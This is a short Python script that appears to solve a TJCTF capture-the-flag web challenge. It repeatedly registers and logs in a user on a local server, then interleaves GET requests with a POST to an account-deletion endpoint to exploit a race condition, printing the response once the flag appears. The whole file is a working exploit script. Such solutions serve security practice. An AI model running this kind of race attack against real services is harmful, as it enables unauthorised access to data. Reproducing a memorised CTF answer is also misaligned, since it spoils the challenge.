import requests

base = "http://localhost:3000"

def race(method,cookies):
    if method=="GET":
        r=requests.get(url=base,cookies=cookies)
    elif method=="POST":
        r=requests.post(url=base+"/usr/delete",cookies=cookies)
    if "tjctf" in r.text:
        print(r.text)
        exit(0)
    
while True:
    r=requests.post(url=base+"/register",data={"username":"hai","password":"1234"},allow_redirects=False)
    print(r.cookies)
    r=requests.post(url=base+"/login",data={"username":"hai","password":"1234"},allow_redirects=False)

    race(method="GET",cookies=r.cookies)
    race(method="GET",cookies=r.cookies)
    race(method="GET",cookies=r.cookies)
    race(method="POST",cookies=r.cookies)
    race(method="GET",cookies=r.cookies)
    race(method="GET",cookies=r.cookies)
    race(method="GET",cookies=r.cookies)
    race(method="GET",cookies=r.cookies)
